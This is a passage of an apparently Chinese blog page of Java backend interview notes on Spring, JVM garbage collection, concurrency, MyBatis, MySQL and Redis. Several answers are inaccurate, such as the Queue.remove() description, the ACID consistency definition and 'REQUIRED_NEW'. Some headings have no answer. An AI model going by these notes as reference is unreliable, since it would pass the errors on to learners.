1.3.1之前，不能在ip_hash中使用权重</li><li>ip_hash不能与backup同时使用</li><li>此策略适合有状态的服务，比如session</li><li>当有服务器需要剔除，必须手动dowm掉</li></ol></li><li><strong>最少连接：</strong>把请求发给连接数最少的服务器。轮询算法是把请求平均发给各个后端，使他们的负载大致相同；但是有些请求占用的时间很长，会导致其所在的后端负载较高。<ol><li>此负载均衡策略适合请求处理时间长短不一造服务器过载的情况。</li></ol></li><li><strong>响应时间（不需要掌握）：</strong>这是第三方策略，需要安装插件。这个就是按服务器的响应时间来分配请求，响应时间短的优先分配</li><li><strong>根据URL分配方式（不需要掌握）：</strong>这是第三方策略，需要安装插件。按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，要配合缓存命中来使用。同一个资源多次请求，可能会到达不同的服务器上，导致不必要的多次下载，缓存命中率不高，以及一些资源时间的浪费。而使用url_hash，可以使得同一个url（也就是同一个资源请求）会到达同一台服务器，一旦缓存住了资源，再此收到请求，就可以从缓存中读取。　</li></ol><h3 id="二十八、IO流的分类"><a href="#二十八、IO流的分类" class="headerlink" title="二十八、IO流的分类"></a>二十八、IO流的分类</h3><ol><li>按数据流的方向：输入流、输出流</li><li>按处理数据单位：字节流、字符流</li><li>按功能：节点流、处理流</li></ol><h3 id="二十九、Java-IO流有什么特点"><a href="#二十九、Java-IO流有什么特点" class="headerlink" title="二十九、Java IO流有什么特点"></a>二十九、Java IO流有什么特点</h3><h3 id="三十、resource和autowired的区别"><a href="#三十、resource和autowired的区别" class="headerlink" title="三十、resource和autowired的区别"></a>三十、resource和autowired的区别</h3><ol><li>都是用来实现自动装配</li><li>@Resource只能用在属性上，默认按照名称匹配，如果没有找到匹配名称的bean，则按类型匹配。是java标准库自带注解</li><li>@Autowired可以用在属性、构造器、方法上，默认按类型匹配，也可以通过@Qualifier指定具体bean，是Spring框架自带的注解</li><li>但是这两种方法都不被官方推荐，官方不推荐属性注入的方式。他们更倾向于构造器方式注入,可以有效提高性能，但是代码需要加final关键字。但是同一在相关服务类加上lombok中的@RequidArgsConstructor注解自动生成构造器，减少代码量</li></ol><h3 id="三十一、Spring-MVC的执行流程"><a href="#三十一、Spring-MVC的执行流程" class="headerlink" title="三十一、Spring MVC的执行流程"></a>三十一、Spring MVC的执行流程</h3><p><strong>什么是MVC？MVC是Model、view、controller的缩写：</strong></p><ol><li>Model（模型）：数据模型吗，提供要展示的数据，因此包含数据和行为，可以认为是领域模型或JavaBean组件。也就是模型提供了模型数据查询和模型数据的状态更新等功能，包括数据和业务</li><li>View（视图）：负责进行模型的展示，一般是我们见到的用户界面，给客户看到的东西</li><li>Controller（控制器）：接受用户请求，委托给模型进行处理（状态改变），处理完毕后把返回的模型数据返回给视图，由视图负责展示。也就是说控制器起调度作用</li></ol><p><strong>spring MVC的执行流程</strong>：</p><ol><li>用户发起HTTP请求，请求直接到前端控制器DispatcherServlet</li><li>前端控制器接收请求后调用处理器映射器HandlerMapping，处理器映射器根据请求的URL找到具体Handler，并返回给前端控制器</li><li>前端控制器会调用处理器适配器HandlerAdapter去适配调用Handler</li><li>处理器适配器会根据Handler调用真正的处理器去处理请求，并且处理对应的业务逻辑</li><li>当处理器处理完业务之后，会返回一个ModelAndView对象给处理器适配器，HandlerAdapter再将该对象返回给前端控制器；这里的Model是返回的数据对象，View是逻辑上的view</li><li>前端控制器DispatcherServlet将返回的ModelAndView对象传给视图解析器ViewResolver进行解析，解析完成后会返回一个具体的视图View给前端控制器（ViewResolver根据逻辑的View查找具体的View）</li><li>前端控制器DispatcherServlet将具体的视图进行渲染呈现给用户</li></ol><h3 id="三十二、JVM有哪些垃圾回收算法"><a href="#三十二、JVM有哪些垃圾回收算法" class="headerlink" title="三十二、JVM有哪些垃圾回收算法"></a>三十二、JVM有哪些垃圾回收算法</h3><ol><li>标记清除算法：<ol><li>标记阶段：把垃圾内存标记出来</li><li>清除阶段：直接将垃圾内存回收</li><li>此算法较为简单，但是会产生大量内存碎片</li></ol></li><li>复制算法：为解决标记清除法的内存碎片问题而诞生。复制算法将内存分为大小相等的两半，每次只使用其中一般。垃圾回收时，将当前这一块的存活对象全部拷贝到另一半，然后当前这一班内存直接清除。这种算法没有内存碎片，但是很浪费空间，而且，他的效率跟存活对象个数有关</li><li>标记压缩算法：为了解决赋值算法的缺陷，就提出了标记压缩算法，此算法在标记阶段跟标记清除算法是一样的，但是在完成标记之后，不是直接清除垃圾内存，而是将存活对象往一段移动，然后将边界以外的全部清除</li></ol><h3 id="三十三、什么是STW"><a href="#三十三、什么是STW" class="headerlink" title="三十三、什么是STW"></a>三十三、什么是STW</h3><p>就是stop-the-world，是在垃圾回收算法执行过程中，需要将JVM内存冻结的一种状态。在STW状态下，java所有线程都是停止执行的（GC线程除外）。</p><h3 id="三十四、常用JVM启动参数有哪些"><a href="#三十四、常用JVM启动参数有哪些" class="headerlink" title="三十四、常用JVM启动参数有哪些"></a>三十四、常用JVM启动参数有哪些</h3><p>大致可以分为三类：</p><ol><li>标注指令： -开头，这些是所有的HotSpot都支持的参数，可以用java -help打印出来</li><li>非标准指令： -X开头，这些指令通常是跟特定的HotSpot版本对应的，可以用java -X打印出来</li><li>不稳定参数： -XX开头，这一类参数跟特定的HotSpot版本对应，并且变化非常大</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 设置堆内存</span><br><span class="line">-Xmx4g  -Xms4g</span><br><span class="line"># 指定GC算法</span><br><span class="line">-XX:+UseG1GC  -XX:MaxGCPauseMillis=<span class="number">50</span></span><br><span class="line"># 指定GC并行线程数</span><br><span class="line">-XX:ParallelGCThreads=<span class="number">4</span></span><br><span class="line"># 打印GC日志</span><br><span class="line">-XX:+PrintGCDetails  -XX:+PrintGCDateStamps</span><br><span class="line"># 指定GC日志文件</span><br><span class="line">-Xloggc:gc.log</span><br><span class="line"># 指定Meta区的最大值</span><br><span class="line">-XX:MaxMetaspaceSize=2g</span><br></pre></td></tr></table></figure><h3 id="三十五、说说对线程安全的理解"><a href="#三十五、说说对线程安全的理解" class="headerlink" title="三十五、说说对线程安全的理解"></a>三十五、说说对线程安全的理解</h3><p>线程安全指，我们写的某段代码，在多个线程同时执行这段代码时，不会产生混乱，依然能得到正常结果。例如i++就是不安全的</p><h3 id="三十六、并发、并行、串行之间的区别"><a href="#三十六、并发、并行、串行之间的区别" class="headerlink" title="三十六、并发、并行、串行之间的区别"></a>三十六、并发、并行、串行之间的区别</h3><ol><li>串行：一个任务执行完才能执行下一个任务</li><li>并行：两个任务同时执行</li><li>并发：两个任务整体看上去是同时执行的，但是在底层，两个任务被拆分成很多分，然后一个个执行，但是宏观层面上两个任务是同时执行的</li></ol><h3 id="三十七、JAVA如何避免死锁"><a href="#三十七、JAVA如何避免死锁" class="headerlink" title="三十七、JAVA如何避免死锁"></a>三十七、JAVA如何避免死锁</h3><p>造成死锁的原因：</p><ol><li>一个资源每次只能被一个线程使用</li><li>一个线程在阻塞等待某个资源是，不释放已占有资源</li><li>一个线程已经获得的资源，在未使用完之前，不能进行强行剥夺</li><li>若干线程形成了收尾相连循环等待资源的关系</li></ol><p>这是造成死锁所必须的4个条件，如果想避免死锁，只要不满足其中之一即可。在研发过程中：</p><ol><li>要注意加锁顺序，保证每个线程安同样顺序进行加锁</li><li>要注意加锁的时限，可以针对锁设置一个超时时间</li><li>注意死锁检查，确保第一时间发现死锁并解决</li></ol><h3 id="三十八、线程中wait和sleep的区别"><a href="#三十八、线程中wait和sleep的区别" class="headerlink" title="三十八、线程中wait和sleep的区别"></a>三十八、线程中wait和sleep的区别</h3><p><strong>wait()</strong>和<strong>sleep()</strong>都是Java中用于线程等待的方法，但它们之间有一些重要的区别。</p><ol><li><p>wait()方法是Object类中的方法，而sleep()方法是Thread类中的方法。</p></li><li><p>wait()方法会释放线程占用的锁，而sleep()方法不会释放锁。</p></li><li><p>wait()方法必须在同步代码块中调用，而sleep()方法可以在任何地方调用。</p></li><li><p>wait()方法会使线程进入等待状态，直到被唤醒或者等待时间到期，而sleep()方法只会使线程进入休眠状态，等待一定的时间后自动醒来。</p></li><li><p>wait()方法必须由其他线程调用<strong>notify()</strong>或<strong>notifyAll()</strong>方法来唤醒，而sleep()方法则可以由线程自己醒来。</p></li><li><p>wait()方法可以避免忙等待，而sleep()方法不能。</p></li></ol><p>总的来说，wait()方法和sleep()方法都可以用于线程等待，但它们的使用场景不同。wait()方法通常用于线程之间的协作，而sleep()方法通常用于线程的时间控制。</p><h3 id="三十九、queue中poll-和remove-方法的区别"><a href="#三十九、queue中poll-和remove-方法的区别" class="headerlink" title="三十九、queue中poll()和remove()方法的区别"></a>三十九、queue中poll()和remove()方法的区别</h3><p><code>poll()</code> 方法和 <code>remove()</code> 方法都是 <code>Queue</code> 类中的方法，但是它们的作用不同。</p><p><code>poll()</code> 方法用于从队列中获取并移除队首元素，如果队列为空，则返回 <code>null</code>。这个方法不会抛出异常，因此在使用时需要注意判断返回值是否为 <code>null</code>。</p><p><code>remove()</code> 方法用于从队列中移除指定元素。如果队列中存在多个指定元素，只会移除第一个匹配的元素。如果队列中不存在指定元素，则抛出 <code>NoSuchElementException</code> 异常。</p><p>因此，<code>poll()</code> 方法用于获取并移除队首元素，而 <code>remove()</code> 方法用于移除指定元素。如果只需要获取队首元素而不移除它，可以使用 <code>peek()</code> 方法。如果需要移除队列中的所有元素，可以使用 <code>clear()</code> 方法。</p><h3 id="四十三、如果我在spring中装载两个类，怎么让他不重复"><a href="#四十三、如果我在spring中装载两个类，怎么让他不重复" class="headerlink" title="四十三、如果我在spring中装载两个类，怎么让他不重复"></a>四十三、如果我在spring中装载两个类，怎么让他不重复</h3><p>如果您在Spring中装载两个类，并且这两个类的功能或属性有重叠部分，您可以通过以下方式来避免它们的重复：</p><ol><li><p>使用<strong>@Primary</strong>注解：在装载类的时候，使用@Primary注解来标记一个类，表示这个类是首选的实现。这样当Spring需要注入这个类时，它就会优先选择使用被@Primary注解标记的类。</p></li><li><p>使用<strong>@Qualifier</strong>注解：在装载类的时候，使用@Qualifier注解来指定需要注入的具体实现。通过指定不同的@Qualifier值，可以让Spring注入不同的实现。</p></li><li><p>使用条件注解：在装载类的时候，使用条件注解来控制是否需要装载这个类。通过使用不同的条件注解，可以让Spring根据不同的条件来装载不同的实现。</p></li><li><p>使用Spring Boot的自动配置功能：如果您使用的是Spring Boot，可以通过自动配置来避免重复。Spring Boot会根据类路径上的依赖关系自动装载相应的类，如果有多个实现，它会根据一定的规则来选择其中一个实现。</p></li></ol><p>以上是几种常见的避免重复的方法，您可以根据具体情况选择合适的方法来解决问题。</p><h3 id="四十三、Spring如何进行依赖注入"><a href="#四十三、Spring如何进行依赖注入" class="headerlink" title="四十三、Spring如何进行依赖注入"></a>四十三、Spring如何进行依赖注入</h3><p>Spring 的依赖注入（Dependency Injection，简称 DI）是通过控制反转（Inversion of Control，简称 IOC）实现的。控制反转是指将对象的创建和依赖关系的管理交给容器来完成，而不是由对象自己来完成。</p><p>在 Spring 中，依赖注入有多种实现方式，包括构造函数注入、Setter 方法注入、字段注入等。其中，最常用的是 Setter 方法注入。</p><p>以 Setter 方法注入为例，下面是 Spring 进行依赖注入的步骤：</p><ol><li><p>配置 Bean：在 Spring 的配置文件中，配置需要注入的 Bean 对象及其依赖关系。可以使用 XML、Java Config 或注解等方式进行配置。</p></li><li><p>创建容器：使用 Spring 的容器来管理 Bean 对象，容器会根据配置文件中的信息创建 Bean 对象，并将它们存储在容器中。</p></li><li><p>注入依赖：当容器创建 Bean 对象时，会自动调用 Bean 对象中的 Setter 方法，并将依赖对象作为参数传入。容器会根据配置文件中的信息，自动创建依赖对象，并将它们注入到 Bean 对象中。</p></li></ol><p>例如，下面是一个简单的 Bean 类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserDao</span><span class="params">(UserDao userDao)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        userDao.save(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Spring 的配置文件中，可以这样配置 Bean：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.UserService&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;userDao&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.UserDaoImpl&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>这样，当容器创建 <code>UserService</code> 对象时，会自动调用 <code>setUserDao()</code> 方法，并将 <code>userDao</code> 对象注入到 <code>UserService</code> 中。而容器会根据配置文件中的信息，自动创建 <code>UserDaoImpl</code> 对象，并将它注入到 <code>UserService</code> 中。这样，就完成了依赖注入的过程。</p><h3 id="四十四、什么是DI"><a href="#四十四、什么是DI" class="headerlink" title="四十四、什么是DI"></a>四十四、什么是DI</h3><p>DI（Dependency Injection，依赖注入）是一种设计模式，它的主要思想是通过外部注入（或传递）依赖对象，来避免在程序内部创建和管理对象的过程。这样可以更好地实现代码的解耦和灵活性，使得代码更易于维护和测试。在 DI 中，依赖关系的管理通常由一个容器来完成，容器中保存了对象之间的依赖关系，程序通过容器来获取所需的依赖对象。常见的 DI 容器有 Spring、Guice 等。</p><h3 id="四十五、谈谈对于IOC的理解（后期要修改）"><a href="#四十五、谈谈对于IOC的理解（后期要修改）" class="headerlink" title="四十五、谈谈对于IOC的理解（后期要修改）"></a>四十五、谈谈对于IOC的理解（后期要修改）</h3><p>在 Spring 中，控制反转指的是将对象的控制权转移给 Spring 框架进行管理，由 Spring 帮我们创建对象，管理对象之间的依赖关系</p><p>以前创建对象的主动权和时机都是由自己把控的，现在由 IOC 容器来做，在很大程度上简化了应用的开发</p><p>IOC 容器实际上就是一个 Map 的键值对，Map 里面存放的是各种对象。IOC 容量就像一个工厂一样，当我们需要创建对象的时候，只需要通过 xml 配置文件或者注解，把对象注册到组件中，而我们完全不用考虑对象是如何被创建出来的。其中，IOC 的最常见以及最合理的实现方式叫做依赖注入（DI）</p><h3 id="四十六、谈谈对于AOP的理解"><a href="#四十六、谈谈对于AOP的理解" class="headerlink" title="四十六、谈谈对于AOP的理解"></a>四十六、谈谈对于AOP的理解</h3><p>AOP，也就是面向切面编程，可以让我们将程序的特定功能从主业务逻辑中分离出来，从而让代码更清晰，更容易维护。有利于提高代码的可读性和重复利用性，并且可以帮助我们处理复杂应用程序中的共同功能，比如日志记录、安全性、事务处理和异常处理等。</p><h3 id="四十七、aop有哪些注解"><a href="#四十七、aop有哪些注解" class="headerlink" title="四十七、aop有哪些注解"></a>四十七、aop有哪些注解</h3><p>在Java中，AOP（面向切面编程）可以使用多种注解来实现。以下是一些常见的AOP注解：</p><ol><li><p><strong>@Aspect：</strong>用于定义切面类。</p></li><li><p><strong>@Pointcut：</strong>用于定义切入点，即在哪些方法上应用切面。</p></li><li><p><strong>@Before：</strong>用于在目标方法执行前执行切面逻辑。</p></li><li><p><strong>@After：</strong>用于在目标方法执行后执行切面逻辑。</p></li><li><p><strong>@AfterReturning：</strong>用于在目标方法返回后执行切面逻辑。</p></li><li><p><strong>@AfterThrowing：</strong>用于在目标方法抛出异常时执行切面逻辑。</p></li><li><p><strong>@Around：</strong>用于在目标方法执行前后都执行切面逻辑。</p></li></ol><p>这些注解都是Spring框架中AOP模块所提供的，可以使用它们来实现切面编程。</p><h3 id="四十八、Spring事务传播机制"><a href="#四十八、Spring事务传播机制" class="headerlink" title="四十八、Spring事务传播机制"></a>四十八、Spring事务传播机制</h3><ol><li>REQUIRED（Spring默认的事务传播类型）：如果当前没有事务，则自己新建一个事务，如果当前存在事务，则加入这个事务</li><li>SUPPORTS：当前存在事务，则加入当前事务，如果没有，则以非事务方法执行</li><li>MANDATORY：当前存在事务，就加入当前事务；不存在就抛出异常</li><li>REQUIRED_NEW：创建一个新事务，如果存在当前事务，则挂起该事务</li><li>NOT_SUPPORTED：以非事务方式执行，如果当前存在事务，则挂起当前事务</li><li>NEVER：不使用事务，如果当前事务存在，则抛出异常</li><li>NESTED：如果当前事务存在，则嵌套在事务中执行，否则开启一个事务</li></ol><h3 id="四十九、Spring事务什么时候会失效"><a href="#四十九、Spring事务什么时候会失效" class="headerlink" title="四十九、Spring事务什么时候会失效"></a>四十九、Spring事务什么时候会失效</h3><p>Spring事务的原理是AOP，进行了切面增强，那么失效的原因就是AOP不起作用了，常见有以下几种：</p><ol><li>发生自调用，类里面使用this调用本类的方法（this通常省略），此时这个this对象不是代理对象，而是当前类对象。解决方法就是让this变为当前对象的代理类</li><li>方法不是public的：@Transactiional只能用于public方法上，否则事务不会失效，如果用在非Public方法上，可以开启Aspectj代理模式</li><li>数据库不支持事务</li><li>没有被Spring管理</li><li>异常被吃掉，事务不会回滚（或者抛出的异常没有被定义，默认为RuntimeException）</li></ol><h3 id="五十、Spring中Bean是线程安全的吗"><a href="#五十、Spring中Bean是线程安全的吗" class="headerlink" title="五十、Spring中Bean是线程安全的吗"></a>五十、Spring中Bean是线程安全的吗</h3><p>Spring本身没有针对Bean做线程安全处理，所以</p><ol><li>如果Bean是无状态，那么Bean是线程安全的</li><li>如果Bean是有状态的，那么就是不安全的</li></ol><p>另外，Bean是不是线程安全，跟Bean的作用域没有关系，Bean的作用域只是表示Bean的生命周期，对于任何生命周期Ban都是一个对象个，这个对象是不是线程安全的，还得看这个对象本身</p><h3 id="五十一、Spring中Bean创建的生命周期有哪些步骤"><a href="#五十一、Spring中Bean创建的生命周期有哪些步骤" class="headerlink" title="五十一、Spring中Bean创建的生命周期有哪些步骤"></a>五十一、Spring中Bean创建的生命周期有哪些步骤</h3><p>Spring中一个Bean的创建大概为以下几步：</p><ol><li>推断构造方法</li><li>实例化</li><li>填充属性，也就是依赖注入</li><li>处理Aware回调</li><li>初始化前，处理@PostConstruct注解</li><li>初始化，处理InitialZingBean接口</li><li>初始化后，进行AOP</li></ol><p>五十二、ApplicationContext和BeanFactory有什么区别</p><p>五十三、Spring中事务是如何实现的</p><p>五十四、Spring中@Transational什么时候会失效</p><p>五十五、Spring容器的启动流程</p><h3 id="五十六、Spring用到了那些设计模式"><a href="#五十六、Spring用到了那些设计模式" class="headerlink" title="五十六、Spring用到了那些设计模式"></a>五十六、Spring用到了那些设计模式</h3><ol><li>工厂模式：FactoryBean和BeanFactory</li><li>原型模式：原型Bean</li><li>单例模式：单例Bean</li><li>构造器模式：StringBuilder就是典型的</li><li>适配器模式：在Spring执行流程中有</li><li>代理模式：AOP就是典型的代理</li></ol><h3 id="五十七、Spring的优点"><a href="#五十七、Spring的优点" class="headerlink" title="五十七、Spring的优点"></a>五十七、Spring的优点</h3><ol><li>低侵入式设计，降低代码之间的耦合</li><li>独立于各种应用服务器，基于Sping框架的应用，可以真正实现一次编写多次使用</li><li>容器提供单例模式支持，开发者不用再自己编写代码实现</li><li>提供AOP技术，可以将一些通用任务，比如安全、事务、日志等进行集中式管理，更好的复用</li><li>ORM和DAO提供了与第三方持久层框架的良好整合，并简化了底层的数据库访问</li><li>Spring并不强制应用完全依赖于Spring，开发者可以自由的选择使用Spring框架的全部或者部分</li></ol><p>五十八、Spring常用注解及其底层实现</p><p>五十九、SpringBoot如何启动Tomcat</p><h3 id="六十、Mybatis的优缺点"><a href="#六十、Mybatis的优缺点" class="headerlink" title="六十、Mybatis的优缺点"></a>六十、Mybatis的优缺点</h3><p>优点：</p><ol><li>基于SQL语句编程，相当灵活，不会对应用程序或者数据库的现有设计造成影响，SQL写在XML中，解除了Sql与程序代码的耦合，便于统一管理</li><li>与JDBC相比，减少大量代码量，不需要手动开关连接</li><li>只要JDBC支持的数据库，Mybatis都支持，所以支持各种数据库</li><li>和Spring集成方便</li><li>提供映射标签，支持对象与数据库的ORM字段关系映射</li></ol><p>缺点：</p><ol><li>SQL语句编写工作量大，在连表查询的时候会有些复杂</li><li>SQl语句依赖数据库，导致数据库移植性差，不能随意更换数据库</li></ol><h3 id="六十一、Mybatis中-和-的区别是什么"><a href="#六十一、Mybatis中-和-的区别是什么" class="headerlink" title="六十一、Mybatis中${}和#{}的区别是什么"></a>六十一、Mybatis中${}和#{}的区别是什么</h3><ol><li>·#{}·是预编译处理、是占位符，${}是字符串替换，是替换符</li><li>Mybatis在处理#{}时，会将SQL中的#{}替换成？号，调用PreparedStatement来赋值</li><li>Mybatis处理${}时，就是把其替换成变量的值，调用Statement来赋值</li><li>·#{}·可以有效预防SQL注入，提高系统安全。而${}不行</li></ol><h3 id="六十二、索引的基本原理"><a href="#六十二、索引的基本原理" class="headerlink" title="六十二、索引的基本原理"></a>六十二、索引的基本原理</h3><p>索引用来快速的寻找那些具有特定值的记录，如果没有索引，一般来说，执行查询时遍历整张表</p><p>把无序的数据变成有序的查询</p><ol><li>把创建了索引的列的内容进行排序</li><li>对排序结果生成倒排表</li><li>在倒排表内容上拼上数据链</li><li>在查询内容时，先拿到倒排表内容，再取出数据地址链，从而拿到数据</li></ol><h3 id="六十三、kafka的特点"><a href="#六十三、kafka的特点" class="headerlink" title="六十三、kafka的特点"></a>六十三、kafka的特点</h3><ol><li><p>解耦合：</p><p>耦合的状态表示当你实现新功能时，是直接接入当前接口，可以将相应消息发送到消息队列，这样的话，如果接口出问题，将不会影响到当前的功能</p></li><li><p>异步处理：</p><p>异步处理替代了之前的同步处理，异步处理不需让流程走完就返回结果，可以将消息发送到消息队列中，然后返回结果，剩下让其他业务处理，接口从消息队列中拉去消息处理即可</p></li><li><p>流量削峰</p><p>高流量的时候，使用消息队列作为中间件可以将流量的高峰保存在消息队列中，从而防止系统的高请求</p></li></ol><h3 id="六十四、事务的基本特性和隔离级别"><a href="#六十四、事务的基本特性和隔离级别" class="headerlink" title="六十四、事务的基本特性和隔离级别"></a>六十四、事务的基本特性和隔离级别</h3><p>ACID：</p><ol><li>原子性：不可再分割</li><li>一致性：要么全部成功要么全部失败</li><li>隔离性：一个事务的修改在最终提交前，对其他事务是不可见的</li><li>持久性：一旦提交，所做的修改将被永远保存到数据库中</li></ol><p>四个隔离级别：</p><ol><li>read uncommit 读未提交：可能读到其他事务未提交数据，也叫脏读</li><li>read commit 读已提交：两次读取结果不一致，叫不可重复读。解决了脏读的问题，他只会读已提交的事务</li><li>repeatable read可重复读：这是mysql的默认级别，每次读取结果都一样，可能产生幻读</li><li>serializable 串行：一般不会使用，她会给没一行读取的数据加锁，会消耗大量资源</li></ol><h3 id="六十五、拦截器和过滤器的区别"><a href="#六十五、拦截器和过滤器的区别" class="headerlink" title="六十五、拦截器和过滤器的区别"></a>六十五、拦截器和过滤器的区别</h3><ol><li><p>拦截器是基于java的反射机制的，而过滤器是基于函数回调</p></li><li><p>拦截器不依赖于servlet容器，过滤器依赖于servlet容器</p></li><li><p>拦截器只能对action请求起作用，过滤器则可以对所有请求起作用</p></li><li><p>拦截器可以访问action上下文、值栈里的对象，而过滤器不能</p></li><li><p>在action周期里，拦截器可以多次被调用，而过滤器只能在容器初始化时被调用一次</p></li></ol><p>六十六、Innodb是如何实现事务的</p><h3 id="六十七、B树和B-树的区别，为什么Mysql使用B-树"><a href="#六十七、B树和B-树的区别，为什么Mysql使用B-树" class="headerlink" title="六十七、B树和B+树的区别，为什么Mysql使用B+树"></a>六十七、B树和B+树的区别，为什么Mysql使用B+树</h3><p>B数的特点：</p><ol><li>节点排序</li><li>一个节点可以存多个元素，多个元素也排序了</li></ol><p>B+树的特点：</p><ol><li>拥有B树的特点</li><li>叶子结点之间有指针</li><li>非叶子结点上的元素在叶子节点都冗余了，也就是叶子节点中存储了所有的元素，并且排好顺序</li></ol><p>Mysql索引使用的是B+树，因为索引是用来加快查询的，而B+树通过对数据进行排序所以是可以提高查询速度的，然后通过一个节点中可以存储多个元素，从而可以使得B+树的高度不会太高，在Mysql中一个Innodb页就是一个B+树节点，一个Innodb页默认16kb，所以一般情况下，一颗两层的B+树可以存200万行左右的数据，然后通过利用B+树叶子节点存储了所有的数据，并且叶子节点之间有指针，可以很好的支持全表扫描，范围查找等SQL</p><h3 id="六十八、Mysql锁有哪些"><a href="#六十八、Mysql锁有哪些" class="headerlink" title="六十八、Mysql锁有哪些"></a>六十八、Mysql锁有哪些</h3><p>按锁的粒度分类：</p><ol><li>行锁：锁某行数据，锁粒度最小，并发度高</li><li>表锁：锁整张表，锁粒度最大，并发度低</li><li>间隙锁：锁的是一个区间</li></ol><p>还可以分为：</p><ol><li>共享锁：也就是读锁，一个事务给某行数据加了读锁，其他事务也可以读，但是不能写</li><li>排它锁：也就是写锁，一个事务给某行数据加了写锁，其他事务不能读，也不能写</li></ol><p>还可以分为：</p><ol><li>乐观锁：并不会真正的去锁某行记录，而是通过一个版本号实现</li><li>悲观锁：上面说的表锁、行锁都是悲观锁</li></ol><h3 id="六十九、什么是RDB和AOF"><a href="#六十九、什么是RDB和AOF" class="headerlink" title="六十九、什么是RDB和AOF"></a>六十九、什么是RDB和AOF</h3><p><strong>RDB：</strong> Redis DataBase，在指定的时间间隔内将内存中的数据集快照写入磁盘，实际操作过程是fork一个字进程，先将数据集写入临时文件，写入成功后，再替换之前的文件，用二进制压缩存储</p><p><strong>优点：</strong></p><ol><li>整个Redis数据库将只包含一个文件dump.rdb，方便持久化</li><li>容灾性好，方便备份</li><li>性能最大化，fork子进程来完成写操作，让主进程继续处理命令，所以是IO最大化，使用单独字进程来进行持久化，主进程不会进行任何IO操作，保证了redis的高性能</li><li>相当于数据集大时，比AOF的启动效率更高</li></ol><p><strong>缺点：</strong></p><ol><li>数据安全性低，RDB是间隔一段时间进行持久化，如果持久化之间redis故障，会发生数据丢失。所以这种方式更适合数据要求不严谨的时候</li><li>由于RDB是通过fork子进程来协助完成数据持久化，所以在当数据集较大时，可能会导致整个服务器停止服务</li></ol><p><strong>AOF：</strong> Append Only File,以日志的形式记录服务器的每一个写、删除操作，查询操作不会记录，以文本的方式记录，可以打开文件看到详细的操作记录</p><p><strong>优点：</strong></p><ol><li>数据安全，Redis提供了三种同步策略，即每秒同步，每修改同步和不同步。事实上，每秒同步也是异步完成的，其效率也是非常高的，所差的是一旦系统出现宕机现象，那么这一秒钟之内修改的数据将丢失。而每修同步，我们可以视其为同步持久化，即每次发生的数据变化都会被立即记录到磁盘中</li><li>通过append模式写文件，即便中途服务器宕机也不会破坏已经存在的内容，可以通过redis-check-of工具解决数据一致性问题</li><li>AOF机制的rewrite模式，定期对AOF文件进行重写，以达到压缩目的</li></ol><p><strong>缺点：</strong></p><ol><li>AOF文件比RDB文件大，且恢复速度慢</li><li>数据集大的时候，比RDB启动效率低</li><li>运行效率没有RDB高</li></ol><p>AOF文件比RDB更新频率高，优先使用AOF还原数据，AOF比RDB更安全也更大，RDB性能比AOF好，如果两个都配了，优先加载AOF</p><h3 id="七十、Redis的过期键删除策略"><a href="#七十、Redis的过期键删除策略" class="headerlink" title="七十、Redis的过期键删除策略"></a>七十、Redis的过期键删除策略</h3><p>Redis是Key-value数据库，我们可以设置Redis中缓存的key的过期时间。Redis的过期策略就是指当Redis中缓存的Key过期了，Redis如何处理</p><ol><li>惰性过期：只有当访问一个key时，才会判断该key是否过期，过期则清除。这样可以最大化节省CPU，但是对内存非常不友好。极端情况容易出现大量过期可以没有被访问而不会被清除，占用大量内存</li><li>定期过期：每隔一定时间，会扫描一定数量的数据库的expires字典中一定数量的key，并清除其中已过期的key。该策略是一个折中方案。通过调整扫描的时间间隔和每次扫描的限定耗时，可以在不同情况下使得CPU和内存资源达到最好的平衡效果</li></ol><h3 id="七十三、Redis有哪些数据结构？分别常用于什么什么场景？"><a href="#七十三、Redis有哪些数据结构？分别常用于什么什么场景？" class="headerlink" 